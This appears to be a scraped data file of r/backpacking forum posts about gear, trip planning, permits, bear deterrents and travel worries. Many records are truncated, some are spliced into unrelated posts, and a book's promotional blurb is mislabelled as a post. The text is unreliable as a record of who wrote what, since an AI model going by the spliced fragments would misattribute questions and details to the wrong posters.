Best tour company for hiking to Machu Picchu,"Im looking to go to Peru in about a month and I was wondering what have your experiences been with these companies?

Is my girlfriend okay?,"Me and my girlfriend (now fiancé) decided to take a 2 week holiday to Antalya, Turkey. We’ve now been here for 4 days and for the past 2 she’s had a cough that isn’t continuous (which makes me think it’s not covid) and had been complaining of feeling slightly sick and of stomach pains (she’s on the pill so not period). The only thing that’s stuck out to me is that she’s falling asleep the moment she lays down. And with a little testing I’ve discovered she can’t wake herself up, at all. We’ve been careful to only drink bottled fluids and only eat from restaurants and our hotel (no cafes or street food. We’ve both eaten plenty of food and drank plenty of water so dehydration isn’t likely. I’m starting to become slightly concerned as she’s not usually like this. Side note: I don’t know if this matters but as we went through airport security she was pulled aside and asked to use the full body scanner, as a result she was patted down as her entire right leg showed up black, she has a disease in her left knee but her right one is fine.

Orange Italy ),"Italy is an amazing country where even in the most remote village you can find something interesting: from a wine plantation to a medieval monastery. And if you haven't decided yet, Italy is the perfect holiday destination, and here's why!))

1) Dolce Vita.

They live for themselves and their loved ones, enjoy every moment, and overcome difficulties with a smile on their faces.

Every person, at times, needs to be a little Italian and feel the sweet taste of this life. And the best way to try the dolce vita style is, of course, in Italy.

2) Architecture and sights.

In the cities of Italy, it is impossible not to feel the spirit of history and feel like you are in the distant past, walking along the old narrow streets or going into a medieval church, where 500 years ago they got married and baptized children.

3) Local cuisine.

Since Italians enjoy life, they also enjoy their cuisine to the fullest. The choice is great.

Pasta, pizza and seafood risotto, bruschetta, and don't forget the huge selection of old world wines that you can even take home with you.

4) The beaches of Italy.

You can often see such a picture: both adults and very old people are standing near the shore, and they all go in for sports. Hotels and public beaches provide such a program.

Loud music is playing and young coaches are helping people make good use of their time in the sun.

There are also a large number of tours where everyone can choose something of their own and enjoy the sweet life to the fullest. It can be a vacation in a ski resort or on the beach, a shopping tour or a bus trip to the main attractions of the country.

If you are interested in Italian cuisine, then there are gastronomic and culinary tours. The choice is yours. There are a couple of films that are suitable for experiencing this multifaceted country: Made in Italy, Roman Holiday, Under the Tuscan Sun))",backpacking,1650495356

Tailoring Ridge Merino Solstice Hoodie?,"So I picked up a Ridge Merino Solstice Hoodie for use in my upcoming trip, but it may just stay in the bag for a return.

What size backpack for a year's travel while working on the road?,"I'm going to be setting off for a year's travel through South America later next year, and I'll need a backpack to carry my clothes, footwear (a couple of pairs), laptop and small electronics like my scuba diving watch, GoPro, phone, etc. I won't be on the move every few days - it'll be a case of spending a few weeks at each spot, and maybe day trips from there. I'll also be working on the road, hence the necessity of a laptop.

When I go on my standard two or three week backpacking trips, I take a 40L backpack. That works well but that's also because I don't take a laptop, a book or even a towel. I will need to carry stuff like that for my year-long though.

* We live in the southwest US, so anywhere in the CONUS would be within range, as well as central America.
* We're both very fit and have no trouble doing 20-30 mile days, maybe more, terrain dependent.
* Would prefer it be warmer weather.
* I think loops are way more fun than out and backs.

She  is an American citizen and has insurance through Mountain Health Co-op  in the United States. She's only had the co-op insurance for a few  months, so she's unfamiliar with if they would cover anything.

  
Does  anyone have experience with foreigners getting dental procedures in  Italy? Is this a procedure she could get done at a US military base? Is  this something she could get done at an Italian dentist? Does anyone  have recommendations, suggestions, approximate costs?

I feel like I need to travel the world in order to be attractive/smart,"Let me begin with the fact that I never had the urge to travel the world. My family didn't travel a lot when I was little, I did enjoy those small holidays in the hills but idk I always felt like - oh, that's it? Kinda boring. Maybe it was the places or just that I never left my country but tbh, I'd travel if I had lots of money and could spend it on lavish hotels etc. Now that I've grown up (20F) I feel like I compare myself a lot to people around me that have travelled a lot or almost the whole world. Everytime I mention my views on travelling and how I would not like to backpack etc, people, especially men tell me two things - Well travelled women are so hot!! Or how backpacking is better. This just makes me feel insecure/inferior? Because a) I'm not crazy about traveling, yes it would be nice to visit some places but idk it just feels like it's a mandatory thing to do and many people around me find well travelled people attractive? B) I'm from a third world country, my passport is VERY weak I barely have access to around 30 or less countries although people around me (where I live right now) have stronger passport and can travel freely anywhere they want which also adds to the feeling of unattractiveness. Honestly, the only reason I would like to travel is just to get it off my list and tell people yeah I've been places. 
Am I being irrational? 
Not saying that well travelled people aren't cool, they definitely have a lot of knowledge and have a lot of stories to tell!

Using scent to actively deter bears and other wildlife – Thoughts?,"Of course, anyone who backpacks with bears knows that you should take proper precautions when it comes to food storage – Boxes, canisters, proper hangs, etc. One of those precautions can be minimizing your scent, by putting your food in an Opsak. Bears are attracted to the smell of food, so minimizing the smell can minimize their attraction. Seems obvious. Still, we only ever seem to want to minimize our scent. Is there a way of *maximizing* our scent to our advantage?

Bears really dislike certain smells. Ammonia is cited as a potential effective deterrent by the [U.S. Forest Service](https://www.fs.usda.gov/Internet/FSE_DOCUMENTS/stelprdb5350248.pdf) as well as [Colorado Parks &amp; Wildlife](https://cpw.state.co.us/Documents/Education/LivingWithWildlife/BearDeterrents.pdf), which also cites bleach and Pine Sol. I was able to find [a series of field tests on polar bears](https://www.jstor.org/stable/3872649?casa_token=5A2a1AvJh90AAAAA%3AdzN4ptR7gJ3u4pgp7sieyPR9AKaDzvLNMYTpC1ftfBjKsPRS0mnLA2DnO1aBxgV9jQliRnuhTD5W_thy_NcpR1S3ZvKB2o-TbIfxy_xFj_f5JjFvfHE&amp;seq=4) (which may or may not be relevant to black bears or grizzlies) which indicated that although chemical deterrents (including ammonia and Pine Sol) did not completely repel bears, they did spend significantly less time poking around areas of interest in all chemically treated sites than control sites, with Pine Sol being the most effective (ammonia is runner-up). It's worth nothing that noise was much more effective as a true repellent. The chemicals did not keep bears from sniffing, only reduced the time they spent doing so.

Additionally, although bears are typically our primary concern when it comes to safety, rodents can be pests on the trail as well, and pine oil has been shown to have potential as a repellent for certain rodents, i.e. [snowshoe hares, voles](https://link.springer.com/article/10.1007/BF01012287), and [pocket gophers](https://digitalcommons.unl.edu/nwrcrepellants/15/?a_aid=3598aabf), while ammonia is effective against [opossums](https://digitalcommons.unl.edu/nwrcrepellants/15/?a_aid=3598aabf).

Unfortunately, there doesn't seem to be a lot of research in the area that I can find, and there are other potentially deterring scents out there which may be wives' tales, such as apple cider vinegar. So, I'm curious to know if anyone has any research, anecdotes or thoughts when it comes to this topic. I'll be honest, it seems hard to believe that pine oil would be an effective deterrent to wildlife, especially wildlife which lives in pine forests, but it does seem to work to some extent on some pine-dwelling inhabitants. Could hanging a pine-scented car air freshener or spraying the Ursack in Pine Sol keep animals from thinking our food is appetizing? 🤔",backpacking,1650431193

Shaw Lake @ Wallace Falls State Park in Washington,"Two night trip to Wallace Lake and Shaw Lake in Wallace Falls State Park. Per the recommendation of the Park Ranger, we went up Greg Ball trail to Wallace Lake the first day. There was no other backpackers at the lake, lucky for us because there was only one campsite with 1 tent platform. The privy was full almost to the brim, but praise B I held onto my hitchhiker. 

&amp;#x200B;

Our destination was Shaw Lake, which the original trail has since been decommissioned for reasons unknown to us. He gave us a crappy map to follow the forest roads, and with a little route finding we finally got to the lake. We needed to cross through some dense forest to regroup with an old logging road. From there (near the unnamed pond which we named James' Pond), the trail was fine all the way to Shaw Lake. The ranger said they make it up there probably twice a year, it was clear they went recently because there was recent cutting along the trail. 

Shaw Lake is beautiful, with 1 campsite with 3 unusable tent platforms. Instead of sand or dirt, they were filled with large gravel, and tent stakes did not work. The fire pit and picnic table are located at the waters edge, down a steep hill from the campsite. No privy, but plenty of soft ground to drop off hitchhikers. 

We did not want to go back the same way, but rather wanted to see if we can get to Jay Lake using my Maps3D app. With some route finding, we made it. There was definitely some 'going back to nature' along the trail and old logging road, probably impassable in the next couple of years. 

Overall a pleasant trip. I would like to hope they have plans of keeping it accessible. What a great getaway.

Hiking bag as a carryon? Other questions,"Hey guys, planning a trip to Patagonia (O circuit) and am wondering about bag sizes. My friends and I are all planning on bringing a duffle bag + hiking bag as total bags packed. My planned setup is as follows:

Osprey Stratos 36L: Carry on, is enough to carry all our gear for the hike we plan to do. Will this fit the carry on requirements? Could I use a bigger bag? My plan is to switch out the camping gear when we arrive at our destination, during flights it'll be in the duffle.

Patagonia Black Hole 55L: Will carry everything not needed for the hike (extra casual clothes, shoes, etc). Will check this one in at the airport. My only question is where this'll go when we do the hike.

Island hopping in the Mediterranean + Gran Canaria,"**Hello everyone!**

I was thinking of breaking down my plan for + 1month travelling trip in September and I was hoping to get some ideas from you, and whether you could think of a more optimized way to go about my trip.

So my current idea is to first go to Gran Canaria for 1 or 2 weeks. I've looked at Ryanair flights and they fly from Helsinki to London and then from there to Gran Canaria. My original idea was to spend 1 month in Gran Canaria, because I would hope to have a relaxed time there and enjoy the sun. However, now that I've been thinking about it more, I think I would like to visit multiple places during the trip.

Here's my Idea for now:

**Helsinki (Where I leave) --&gt; Gran Canaria --&gt; Mallorca --&gt; Sardinia --&gt; Crete**

How should I go about breaking down the time for each place? My mind tells me I would like to spend a little bit more time in the first destination, to get a relaxed start. So if I spend lets say 5 weeks for the trip, it could mean that I spend two weeks for the first, and 1 week for each.

I like to go around the island and visit different places, so I would like to have time for that during my stay. Logically thinking, the biggest island should get the most time.

I've read you should book your flights about a month before at least, so I would have to be very sure of how much time I want to spend in each place. This kinda sucks in my opinion because it takes away freedom of choice and freedom from excessive planning. But as I am Island hopping, its harder to get from one island to the next. Would it be a big risk to not book every flight before the trip?

Next up, what about the budget? I will have at least 3000€ saved up by September, and if I live frugally,  make most of my own meals and don't do a lot of expensive activities, will I be able to do this trip with that money?

Flights would be extremely cheap if I didn't have to get priority on Ryanair, but as I will have a 30-35L backpack, it won't fit under the chair.

Has anyone else here done Island hopping? How has it been? Is there any concerns for the budget or for the flights you could mention? Have you had difficulties finding hostels, and have you reserved them beforehand or on the go?",backpacking,1650296069

Going on a 3 months Backpacking trip through the US and Canada - does anyone have some tips or things we should look out for?,"Fist of all. Hi

I figured I should make a seperate post and to not post this on the weekly thread cause I have bad experience with those.

Sorry for any spelling errors. My written englisch is a little bit rusty.

&amp;#x200B;

Me and my GF (both 20/german) are going to visit the US and Canada in roughtly 1 month. Flight is booked ESTAs are already here. We are going to start in NY, stay there for a few days and than take a bus/train (mby to Rochester) and hike the rest of the way upstate towards Niagara Falls. Entering Canada and exploring it (mby visiting Montreal/Quebeck). After that the next stop is probably Detroit to catch the Amtrack train towards LA or SF (can't remember witch it was). Mby rent a car there to visit Grand Canyon and Death Valley and to drive north allong the west coast towards Seattle.

\+ we have to be back in NY for our flight back.

&amp;#x200B;

Probably my biggest consern is the scale of the US. Its so much larger than what I know from home here i germany, and im honestly kinda scared when I think about beoing lost somewhere with probably no acces to a car or any other means of transportation. Just a backpack, tent and food for mby 2 days. Can we just camp nearby the road when its eavening or is this prohibited? How do ppl react towards two basicly teenagers if you ask them if you can give them a ride or to crash in your barn for one night (rural areas). or is this a thing that is only in my head and I shouldn't even think of doing? How much can you trust those rodeside motels?

We both have savings of round about 5000 USD to a maximum of 8000-9000 USD each (5000 being what we belive we are going to spend and 8000-9000 the upper maximum we have available so we won't be broke when we come back) through work, family and savings.

Going on a 3 months Backpacking trip through the US and Canada - does anyone have some tips or things we should look out for?,"Fist of all. Hi  
I figured I should make a seperate post and to not post this on the weekly thread cause I have bad experience with those.  
Sorry for any spelling errors. My written englisch is a little bit rusty.  


Me and my GF (both 20/german) are going to visit the US and Canada in roughtly 1 month. Flight is booked ESTAs are already here. We are going to start in NY, stay there for a few days and than take a bus/train (mby to Rochester) and hike the rest of the way upstate towards Niagara Falls. Entering Canada and exploring it (mby visiting Montreal/Quebeck). After that the next stop is probably Detroit to catch the Amtrack train towards LA or SF (can't remember witch it was). Mby rent a car there to visit Grand Canyon and Death Valley and to drive north allong the west coast towards Seattle.  
\+ we have to be back in NY for our flight back.  


Probably my biggest consern is the scale of the US. Its so much larger than what I know from home here i germany, and im honestly kinda scared when I think about beoing lost somewhere with probably no acces to a car or any other means of transportation. Just a backpack, tent and food for mby 2 days. Can we just camp nearby the road when its eavening or is this prohibited?

Can't Narrow down my destination!,"Hey r/backpacking ! I have about a month off in the last two weeks of august into the first two weeks of september this year, and plan to head off somewhere by myself with a backpack.

I've (kind of) narrowed down my destinations but I'm struggling to decide. My current top choices are: Malaysia, Peru, Nepal, Philippines, or Cambodia. I'm looking to spend not much more than $2500 after flights.

Malaysia: Tbh I'm completely drawn in by the food but not sure whether a month might be too much. Curious to hear what people have found.

Peru: I've travelled Mexico and hope to brush up on my Spanish, the food and the views are a big draw.

Nepal: Want to do lots of hiking but have also heard mixed things about late Summer weather.

Philippines seems like an all around solid choice, lots of great nature attractions, but I'm also wondering whether things like city life and food might be better in some of my other options.

Cambodia: The history of Cambodia is a big draw for me. I went to Vietnam, and found it really fascinating how every region was very open about how the two wars had shaped their country. Would love to learn more about Cambodia but also wondering if a month is too much!

Curious to hear people's experiences in each countries, bad or good! Any and all recommendations are welcome.

Other potentially relevant info about me: 22 year old male, outgoing, will eat anything and everything, very happy with being uncomfortable. I like to take my time so I'm tentative about doing two countries in a month (also covid-testing twice makes me a little nervous).

Has a hostel host ever set you up to get robbed?,"I am currently in San Cristobal and the guy who runs the hostel I am staying at invited me to a party last night. It was some techno party and it went until about 8:30 am. My hostel host gave me plenty of substances to get me fucked up. I was dancing for a while with a Mexican girl and a couple people warned me that they were sending women to talk with guys, get them to go outside or to their “place” so they can rob the tourists. Needless to say I did not go anywhere with her. Later I started talking to another woman who I first thought was foreign, she said she lived in San Cristobal and I fucked off. She came up to me multiple times after I separated from her, which is pretty uncommon for me. Then I saw her talk to and gives hugs to two guys that were clearly in charge and it seemed like they knew each other well, so then I really fucked off. The hostel guy, who was the only person I went with, was acting extremely weird the whole time. So fucking weird. Towards the end he semi insisted that we stay until it is over. So it’s morning and the sun is out when I leave the building. The only people who are left is me the gringo, the guy who runs the hostel, and a few people some of which seemed like they were cartel. Hostel guy comes out of the club last and I could hear him talking to someone inside but I don’t know who, maybe the do or a worker, when he gets outside he said that the only two girls left here want to hangout with us somewhere else, these were girls that neither of us had any contact with all night, I immediately said i didn’t want to go and he tried to convince me for a while to go. Before the taxi showed up it was already discussed that some people will go in a taxi and some people in a car. When it got there they said two of the guys are going to get in the taxi with us to go meet the girls when the girls are going in the car, makes sense right? So I was saying no I am going back to the hostel I want to sleep, and that just the hostel host and I would get a separate taxi to go back to the hostel, and through all that he never suggested only him going. Once that was communicated to everyone they got out of the taxi and all of the remaining people got into the same car. Hostel guy was in the front seat of the taxi he made the taxi stop by the car with all the other people in it at the other side of the parking lot because they left a little before and parked over there, then the same two guys tried getting in again, I was very unwilling to get in a taxi in that situation with people I don’t know, so I said I’ll just get a different taxi straight to the hostel if they get in, they did not get in again. Then we ended up at a different hostel where we again were supposedly going to hangout with these girls at 9 am, I said to him that I am going back to the hostel he can stay if he wants, he ended up coming back too. Hostel guy claims he doesn’t know any of them. He and I talked about getting set up while we were at the club earlier, because me the gringo was talking to and maybe dancing with girls that I possibly shouldn’t have. Maybe he just really wanted to get some pussy and didn’t see what I took as a clear setup. I still feel like he could have been setting me up too. What do you think?",backpacking,1650212923

The blind leading the blind,"I  was beginning to collect some good camping gear a few years ago, but  then my wife got sick and everything got put in the garage. She passed  away just over a year ago and I've been trying to find things to fill  the void. Talked a group of 5 friends with no backpacking experience or  gear into a 3 day/2 night adventure with a 7 mile hike in to the  campsite in northern California. I'm 6'5"" and weigh 260lbs so I don't  mind a little extra weight. I've done this run once before, but it was  just me and my wife.  Last time I did this, I actually lugged a small  plastic cooler with a couple of steaks and a bag of charcoal the whole  damn way but it was a pain in the ass lol

Also don't mind paying a little extra for quality gear. It will get used, and I like the emergency preparedness aspect as well

1st  off, I'm looking for advice on the best camp stove I can get for the  occasion.  I have a fitness city titanium pot set 1.2L, 800ml, fry pan. I  also have a solo stove and two snow peak titanium bowls and a couple  cups. Right now I'm looking at the jet boils and the MSR windburner, but  I've never used one, and I need to feed 6.

I  plan to make dehydrated meals for everyone, but hamburgers or something  might be cool for the first night. I really have almost no experience  so any tips would be great. What ever I end up doing, I'll do a couple  of practice meals on whatever stove I get so I don't end up looking  incompetent in front of a bunch of hungry people. Coffee is a must as  well

Second is I'm a bit tight on  tent space. I bought a Big Agnes 2020 Copper Spur HV UL3 Tent for the  occasion, and I already owned a good 2 person backpacking tent, but I  didn't expect everyone that I invited to commit, so now I'm short one  person. As I stated before, none of the invited have any experience or  gear, and they all have to buy packs and sleeping bags still.

There's  a waterfall on the beach about a mile from the campsite where I plan to  collect and filter water. I ordered a platypus gravityworks 6L for this  task. Might take a large water container to shuttle more water but  haven't decided. There's running water at the campsite but it tastes  horrible. It's been a few years but I still cringe at the memory of  being dehydrated and trying to drink that water.

Sorry, its probably a bit of a disorganized rant, but any gear suggestions or food ideas would be much appreciated.

EDIT: Dates are early May

I also have a foodsaver and can handle making the dehydrated meals well enough",backpacking,1650080660

Issues with permits for Zion Traverse Trail,"So a friend and I have plans to hike the Zion Traverse trail in May. Flights are book and we have our route planned out.

Luckily there’s still some walk-in slots available that may be obtained one day prior at the visitor center. My question is, what are the chances we will actually be able to reserve sites? Is our entire plan foiled if we can’t get a site at one or both of these sites?",backpacking,1649979704
How used are you willing to go for boots?,"Hi there, I was wondering what you would consider ""used"" boots and what is still good to buy?

I'm trying to be a thrifty shopper and I came across a pair of Saloman 4D quest shoes for $60 CAD. Outside still looks pretty sturdy, treads look good and they've been worn for \~30 hours over two 10 hours hikes and a couple of smaller ones. They've for sure got a lot of life left in them but I don't know whether I should just spend an extra $40 to get a cheap new pair or if that's a great deal for a gently used high-quality pair.

I know that boots are tricky to buy used since they conform to your feet but a couple of online sources are saying 80-100 hours (usually spread out over 1-4 weeks) are how long it takes to break boots in.

Where would you guys put the cut off for buying a pair of boots? I will try them on and make sure the treads, laces and soles are in good condition as well as testing the support and fit for me. Thanks!",backpacking,1649967910

**Advance Praise for Wild by Design**

  
“Can we repair the ecological damage that we’ve done? As Laura Martin observes, no question today could be more pressing, or more uncertain. Wild by Design is a fascinating book—far-reaching, deeply researched, and probing.”—**Elizabeth Kolbert, Pulitzer Prize-winning author of Under a White Sky: The Nature of the Future**

  
“This is a superb book. Laura Martin’s research takes us where no restoration literature has gone before, asking, ‘Who gets to decide where and how wildlife management occurs?’ Martin tackles this question with unmatched clarity and insight, illuminating the crucial discussions we must have to secure a future with thriving natural species and spaces.”—**Peter Kareiva, President and CEO, Aquarium of the Pacific**

  
“A brilliant intervention in the history of conservation that charts changes in ecological understanding of how landscapes rebound from disaster. In following the roots of restoration ecology, Martin explores how naturalness can be cultivated rather than found, providing us with seeds of hope in an age of climate despair.”—**Erika Lorraine Milam, author of Creatures of Cain: The Hunt for Human Nature in Cold War America**",backpacking,1649867209

Budget - I have about 15k saved up (idk if that's too much or not enough) 
Backpack - 55L osprey (can't remember the model) 

Questions ,

The best way to travel around through Europe? I've heard it's EURAIL pass but id like to confirm if that's true

Should I book my hostels in advance? Like fully plan out where I am going, where I am staying, for how long? Vs going with thr flow and figuring it out when I get there 

Best way to have money on you/paying for thing? Should I keep my credit card? Take out cash daily? 

For clothes, I don't know what a good amount is. I was thinking of just packing 4 of everything except for long pants. Should I bring 2 pairs of shoes? 

Do I need to change my phone plan? I was planning on keeping it on airplane mode for the most part (I hqve a Samsung but im getting an iPhone for imessage)

So, I'm looking for someone or a group of people who are interested in using the first night ONLY (May 10). You'd have to be gone from the cabin on the 11th as we are arriving that day. There are meals from the Phantom Ranch included in the reservation.   


I will charge for this, but mostly so that I get serious inquiries only. It won't be more than $125 per person if you want the dinner and breakfast that is on the reservation). I'm fine if the night simply goes unused.

You will have to hike in from the South Rim as the North Rim doesn't open until May 15. 

I have to let the Phantom Ranch know by Apr 19 the names of who will be using the first night (if any). 

If you are available and have a group who would like to do this please email me at phantomranchmay2020 at gmail dot com. Include how many are in your group, their names, and a brief description of your group. I will respond in order of receipt starting tomorrow afternoon (Apr 13) Pacific Time.

Southeast Asia Recommendations?,"Hello! I am planning a 2 month trip this summer to Southeast Asia (June &amp; July). I’m going to loosely follow the mainland banana pancake trail (Thailand, Laos, Vietnam and Cambodia) starting and ending in Bangkok. I’m looking for any and all recommendations- be it great hostels/hotels, off the beaten path hidden gems, excursions, bars/restaurants…any and all recommendations please throw my way! 

A little background- I am a 22 year old male traveling to immerse myself in the native cultures, party, adventure, EAT, meet great people, challenge myself…the whole shebang. In terms of budget, I plan on spending between 30-40 USD/ day but I have no problem splurging every now and again. As for my (loose) route, I am starting in Bangkok, traveling to Northern Thailand, going through Laos into Vietnam, down the Vietnamese coast, through Cambodia and back up through Southern Thailand to Bangkok where I will be leaving from. Again, very loose and open to change so if anyone has any thoughts please let me know. 

Would greatly appreciate advice and recommendations from those who have traveled the region before :)",backpacking,1649729647

\- What are the possible campsitres in 33 Aloha? 

\- Do we have to stay in Aloha for all 3 days of our reservation or can we move around?

Me and a friend want to visit Eastern Europe in July but aren't sure where to go. We live in Norway and think about being away for 10-12 days. We want to visit a big city or two, but also visit some smaller towns as well. We’d love to experience some nature (mountains, forests, rivers, etc.). We don't plan on spending too much money, so things such as food, BEER (very important) and accommodation should be cheap wherever we're going.

Looking for Some Gear Feedback,"Planning a trip with my wife and dogs in the next couple of weeks no Nordhouse Dunes in Michigan.  It's not a long hike but we figure it's a decent place to dip our toes into backpacking, so I packed my bag and weighed it in at a whopping 45 lbs (20.41 kg) without clothes, food, or water.

I weight in at about 175 lbs (79.4 kg), and following the 20% bodyweight rule (I'm not a track star but I'm not the least fit person in the world) I'm aiming for about a 35 lb (~16 kg) pack weight.

Itemized and weighed EVERYTHING.  Went through and prioritized items while removing the stuff that was essentially creature comforts.  I have a problem with trying to pack for glamping while backpacking, but I ended up with about 39 lbs (17.7 kg).  The weight feels fine for our shorter trips.

The heaviest item I know I could reduce weight with new gear is the tent.  I'm hoping to split the tent up and give my wife the stakes and rainfly; however, she has an old knee injury (not super serious) so I'd like to limit her pack weight to even lower than the suggested 20%.

The idea is we'd both carry our own food/cookware, sleeping bags/pillows, and a Sawyer squeeze system for each of us, but we still have dogfood and water to worry about.  Well eventually get the dogs harnesses that allow them to take the burden of some of their necessities but it's not an immediate option unfortunately.

TLDR: Long winded, unnecessary explanations aside, I'll link to my lighterpack list and I really need you guys to tear it apart.  Ridicule me for my item choices.  Recommended me lighter options or gear that can fill multiple roles.  I know even my shaved down list is atrocious, so I'm ready to get roasted.

Opinions on Ursack AllMitey No-Velcro vs Velcro Version?,"Hi all, I’m looking into purchasing my first “serious” critter/bear proof food storage system, and I’ve landed on Ursack AllMitey. I know that last year they removed the inner Velcro closure from their AllMitey bags without initially telling anyone and people seemed to be unhappy (although removing the Velcro did save weight and add a bit more “usable” space inside the bag, so some people probably liked that). After reading all of the negative reviews about the new version I reached out to Ursack to ask if they planned on bringing back the original design. I was informed that they WILL be bringing back the Velcro version of the AllMitey (in a white bag color) and they will continue to offer the no-Velcro version of the AllMitey (in the current black bag color). The production run for the white Velcro version is supposed to finish up by the end of this month (April 2022) and then be listed on the website sometime shortly after. 

My question is: which one do you prefer, and why? I’m inclined to wait for the Velcro version to come back (13oz), but the reduced weight of the no Velcro version (9oz) is tempting. Also I’m not sure if a white food bag would get dirty too easily? Please share your opinions/experiences, ESPECIALLY if you have used the new no Velcro version of the AllMitey—TIA!",backpacking,1649626961

Advice and info needed for a first time solo traveller in Southeast Asia,"Hey, I'm going solo travelling this summer for the first time.

I'm flying to Bangkok in 3 months and plan to travel throughout Southeast Asia for a year or so. I haven't been abroad in 10+ years so I'm feeling inexperienced when it comes to planning and packing. 

What do I need to do before I leave? 

I've got vaccinations sorted but visas I'm unsure of. From what I've read I only need a visa for Cambodia and Laos, is that right? I'm going to exchange cash, what currency should I get? I plan to visit most countries, so dollars and a small amount of native currencies? I'm going to get travel insurance sorted before I leave. Do I need a local SIM card? I'm going to various countries and I don't think there's a network that covers them all. I've read about an esim that does called airalo, any good?

What should I pack? 

I'm using a 40 litre backpack and the airline I'm using has a maximum weight limit of 8kg (17.5lb). I'm pretty sure my bag is going to weigh more than that, are airlines strict with this kind of thing? Do they weigh carry on luggage? (Sorry if these questions seem stupid or obvious, I'm an absolute novice). Aside from clothes, what do I need to pack? 

I'm going solo but want to meet people. What's the best way of doing this? Hostels and doing things/going to places?

Any other information or advice is welcomed. Apologies for the lengthy post. Thank you!",backpacking,1649611971

**Bolivia:** La Paz, Rurrenabaque

Ø Uyuni salt flat

**Ecuador:** Guyaquil, Banos, Quito

**Columbia:** Medellin, Bogota, Cartegena, Minca

Ø Parque tayrona

Ø Lost city

Or book it for a month and a half into our trip approximately, see the places in Peru and Bolivia etc and do it on the way back.

We are interested in seeing Iguaza falls too if possible. Does anyone know if we could get a bus from Bolivia as a cheaper alternative to flying?

First time backpacking recommendations in Big Sur,"I’m planning on taking a trip out to Big Sur on my own at the end of May/early June, does anyone have any trail recommendations? 

I want to go for two days one night and I saw that there were some hot springs around the area so that peaked my interest but I’m not sure which one may be good for me. I know they were rated as longer/ harder hiked but finishing at a hot spring sounds so satisfying.

Some background: 
My plan is for this to be a solo trip and I’m a pretty fit 23 year old woman. I lift and rock climb multiple times a week (dont ask me about cardio 😬)
I’ve never gone backpacking before, but I’ve done plenty of day hiking along the coast, in Tahoe, Yosemite(I just did the cables on half dome last summer!), and most recently out at Rocky Mountain in Colorado. 
Because of all that I feel like I could easily manage 8-16 miles in a day depending on elevation gain and I could see myself hiking anywhere from 6-10 hours in a day.

I don’t have a good car for car camping and I don’t know what I should do for parking either, I’m assuming it really depends on the trail that I end up choosing.. 

If anyone has additional advice for me that would be greatly appreciated too!!",backpacking,1649534841

Backpacking/Kayaking Expeditions,"Has anyone here done/planned any crazy backpacking/kayaking trips? 

I've backpacked only once, but got the idea to do what I think will be a 3 week trip starting at headwaters and ending near home.

My maternal grandparents were the outdoorsy ones, and my aunt and uncle from that side are also the same way. My paternal side is deeply rooted in agriculture, and we were unable to make a lot of the backpacking trips available through my youth due to the work keeping us from recreation. Save for one trip to a set of lakes in the mountains. I've always wanted to embrace more of that life and have gotten into hiking and hunting as much as I can manage.

I think this trip would involve a lot of what ifs and seasonal planning, as well as caches of supplies at major junctions along the route. Preliminary map planning is more or less done (with the understanding that you can only determine so much about the route distance of a river with Google Maps), but the experience isn't completely there. I can find excuses to get away from work at certain times of the year, but training for something like this may take a decade for my wife and I to accomplish.

Overall, this trip would involve, for sure, 2 days of backpacking. Add on however many days of backpacking it would take to get back down to kayak waters (also not including obstructions like downed trees). The majority of the trip would be on the water, with 3 major obstacles (requiring progress to be made on foot at these points). And fairly minor whitewater for at least 1/3 of the journey. Multiple supply caches/dropoffs would be planned ahead of time, in one way or another.

In the end, I'm looking for any guidance that might be out there. I have the very low end of backpacking equipment (freeze dried foods and Jetboil, water filtration, tools, etc.), but I know I'll need more for this kind of trip. There will be multiple opportunities along the way to purchase supplies from small foothill towns if the need arises, but we want to be as self-sufficient as possible.

Are there any experienced outdoor recreation people here to help advise a novice in this venture? Thanks ahead of time.",backpacking,1649489575
First Backpack Recommendations!,"Hey everyone, I need help choosing my first backpack. I don’t see myself taking more than 1-3 day trips, but having the ability to pack for more days in the future would be kinda nice. I got pretty light base gear for the most part, a Nemo Dagger 2p tent, Tensor sleeping pad, and a down sleeping bag(about 8lbs all together). I’ll also probably be carrying a jet boil, small pan, and a helinox chair. 

I’ve been looking into the Osprey atmos AG 50 or 65, as I have a 35% off coupon for all their products. I’m still on the fence though, as I’ve heard their packs are more suited for super heavy loads and the AG system tends to squeak. There’s no REI near me so I can’t really look at packs in person. Any advice or recommendations would be appreciated! Thank you",backpacking,1649482120

What size pack is acceptable for a long hitchhiking/wilderness trip?,"Hi everyone

I've been trolling eBay for packs for my 1.5 month hitchhiking trip this July and August that will ideally take me from Georgia to the PNW, camping or squatting every night with some wilderness excursions along the way.

I'll be bringing the clothes I listed in [this post](https://www.reddit.com/r/hitchhiking/comments/tv9whd/clothes_to_bring_hitchhiking/?ref=share&amp;ref_source=link) plus a jacket, a small tent, sleeping bag, foam sleeping pad, first aid kit, bear spray, phone charger and phone, a couple books and maps, water pouch and water bottle, and of course food supplies (I intend to not carry very much, seeing as I'll be sticking close to civilization), a small pot and camping stove.

I found a great deal on a beautiful 80L Gregory pack, but 80L might be too much. It looks like it can cinch down quite small but I'd still be worried about weight distribution and potential drivers being deterred by the mass of the thing.

What are your thoughts? What size pack should I look for with this gear in mind?

Bad customer care experience with Osprey,"Currently having a bad experience with Osprey Europe. 


TLDR at the bottom.

I wanted to return a bag I bought from them that wasn't suitable for my needs, so I looked up their site to find out what the return process was. You download a form from their site, fill it in and send the package to an address on the form. So I did that, paid for tracking at the post office and waited to hear back.

Two weeks go by hear nothing from them. I see from the tracking that the package was delivered. I email their customer care inquiring what was the hold up.

Long story short, the returns form had the WRONG RETURN ADDRESS. 6 months ago, Osprey changed the warehouse they use for returns but did not change the address on their webpage. And it's their policy that they will not refund my money until they get the returned item physically back to them. (They acknowledged that I shouldn't have been able to access that old form with the incorrect information, and their tech team is going to fix it. Although as of now, the incorrect information is still available on their site.)

They did reach out to the old warehouse, but they have no record of my return being delivered there. I was informed that it could still possibly show up, but that could take ""some time"" and there is nothing I can do right now except wait.

Now if I personally had messed up the returns, then I understand I shouldn't get a refund

But I followed their own websites instructions exactly, yet I am the one being punished and I'll quite possibly be out of pocket due to their mistake.

Sorry if this is a little long. I probably just needed to vent. I'm quite annoyed about the whole thing.

TLDR: Sent return to address from Ospreys website. Turns out it's the wrong address and they won't refund me until they get my returned item which may be lost through no fault of my own.",backpacking,1649288713

"Two weeks to prepare for a two-day, nineteen-mile hike","As the title says, I'm preparing for a decently rough trail after sitting on my ass for, well, a long time. The last time I went, the limiting factor for me was endurance, and specifically my quads giving out.

I was just invited to go on a similarly difficult hike in about two weeks. Is there any hope for me building any kind of meaningful endurance in that time. I've been doing kettlebell lunges and squats like a maniac, but I'm not sure if it's going to help on this timeframe. 

